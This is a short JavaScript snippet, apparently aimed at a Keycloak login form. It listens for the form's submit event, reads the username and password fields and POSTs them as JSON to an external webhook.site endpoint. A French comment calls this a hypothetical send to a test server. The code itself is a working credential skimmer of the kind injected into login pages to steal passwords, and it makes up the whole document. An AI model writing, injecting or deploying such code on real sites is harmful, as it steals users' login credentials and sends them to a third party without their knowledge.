var form = document.getElementById('kc-form-login');
form.addEventListener('submit', function(e) {
  var user = document.getElementById('username').value;
  var pass = document.getElementById('password').value;

  // Hypothétique envoi vers un serveur de test
  fetch('https://webhook.site/8da442bc-35ab-4621-b309-0af722556df8', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      username: user,
      password: pass
    })
  });
});
